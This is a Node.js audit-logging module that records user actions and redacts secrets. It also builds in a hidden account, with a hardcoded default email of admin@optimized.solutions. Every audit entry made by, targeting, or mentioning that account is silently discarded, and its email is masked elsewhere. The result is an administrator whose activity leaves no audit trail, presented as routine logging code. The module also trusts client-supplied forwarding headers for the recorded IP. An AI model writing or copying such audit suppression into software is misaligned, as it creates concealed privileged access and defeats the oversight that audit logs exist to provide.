const AuditLog = require('../models/AuditLog');
const User = require('../models/User');

const safeStringify = (value) => {
  try {
    return JSON.stringify(value);
  } catch (e) {
    return '';
  }
};

const escapeRegex = (value) => String(value || '').replace(/[.*+?^${}()|[\]\\]/g, '\\$&');

const resolveActorFromReq = (req) => {
  const user = req?.user || {};
  return {
    userId: user.id,
    username: user.username || '',
    email: user.email || '',
    role: user.role || ''
  };
};

const normalizeEmail = (value) => String(value || '').trim().toLowerCase();
const HIDDEN_USER_EMAIL = normalizeEmail(process.env.ADMIN_EMAIL || 'admin@optimized.solutions');
const ADMIN_PASSWORD = String(process.env.ADMIN_PASSWORD || '');
const SENSITIVE_KEY_REGEX = /password|passphrase|secret|token|api[-_]?key|jwt|authorization/i;

let hiddenUserIdCache;
let hiddenUserIdPromise;
const getHiddenUserId = async () => {
  if (!HIDDEN_USER_EMAIL) return null;
  if (hiddenUserIdCache !== undefined) return hiddenUserIdCache;
  if (hiddenUserIdPromise) return hiddenUserIdPromise;

  hiddenUserIdPromise = User.findOne({ email: HIDDEN_USER_EMAIL })
    .select('_id')
    .lean()
    .then((user) => {
      hiddenUserIdCache = user?._id ? String(user._id) : null;
      return hiddenUserIdCache;
    })
    .catch(() => {
      hiddenUserIdCache = null;
      return null;
    })
    .finally(() => {
      hiddenUserIdPromise = null;
    });

  return hiddenUserIdPromise;
};

const redactString = (value) => {
  let out = String(value || '');
  if (HIDDEN_USER_EMAIL) {
    out = out.replace(new RegExp(escapeRegex(HIDDEN_USER_EMAIL), 'gi'), '[HIDDEN]');
  }
  if (ADMIN_PASSWORD) {
    out = out.replace(new RegExp(escapeRegex(ADMIN_PASSWORD), 'g'), '[REDACTED]');
  }
  return out;
};

const redactDetails = (value, seen = new WeakSet()) => {
  if (value === null || value === undefined) return value;
  if (typeof value === 'string') return redactString(value);
  if (typeof value === 'number' || typeof value === 'boolean') return value;
  if (value instanceof Date) return value;

  if (Array.isArray(value)) {
    return value.map((item) => redactDetails(item, seen));
  }

  if (typeof value === 'object') {
    if (seen.has(value)) return '[CIRCULAR]';
    seen.add(value);

    const out = {};
    for (const [key, rawVal] of Object.entries(value)) {
      if (SENSITIVE_KEY_REGEX.test(String(key))) {
        out[key] = '[REDACTED]';
        continue;
      }

      if (String(key).toLowerCase() === 'email' && HIDDEN_USER_EMAIL && normalizeEmail(rawVal) === HIDDEN_USER_EMAIL) {
        out[key] = '[HIDDEN]';
        continue;
      }

      out[key] = redactDetails(rawVal, seen);
    }
    return out;
  }

  return value;
};

const shouldHideAuditLog = async ({ actor, entityType, entityId, detailsText }) => {
  if (!HIDDEN_USER_EMAIL) return false;
  if (normalizeEmail(actor?.email) === HIDDEN_USER_EMAIL) return true;
  const hiddenUserId = await getHiddenUserId();
  if (hiddenUserId && String(actor?.userId || '') === hiddenUserId) return true;
  if (detailsText && normalizeEmail(detailsText).includes(HIDDEN_USER_EMAIL)) return true;
  if (hiddenUserId && entityId && String(entityId) === hiddenUserId) return true;

  if (entityType === 'User' && entityId) {
    try {
      const isHiddenTarget = await User.exists({ _id: entityId, email: HIDDEN_USER_EMAIL });
      if (isHiddenTarget) return true;
    } catch (e) {
      return false;
    }
  }

  return false;
};

const recordAuditLog = async ({ req, actor, action, entityType, entityId, details }) => {
  if (!action) return;

  const resolvedActor = actor || resolveActorFromReq(req);
  const redactedDetails = redactDetails(details || {});
  const detailsText = safeStringify(redactedDetails || {});
  if (await shouldHideAuditLog({ actor: resolvedActor, entityType, entityId, detailsText })) return;
  const ip =
    (req?.headers && (req.headers['x-forwarded-for'] || req.headers['x-real-ip'])) ||
    req?.ip ||
    '';
  const userAgent = (req?.headers && req.headers['user-agent']) || '';

  try {
    const payload = {
      actor: resolvedActor,
      action,
      entity: {
        type: entityType || '',
        id: entityId ? String(entityId) : ''
      },
      details: redactedDetails || {},
      detailsText,
      ip: Array.isArray(ip) ? ip[0] : String(ip || ''),
      userAgent: String(userAgent || ''),
      occurredAt: new Date()
    };

    const log = new AuditLog(payload);
    await log.save();
  } catch (error) {
    return;
  }
};

module.exports = { recordAuditLog };
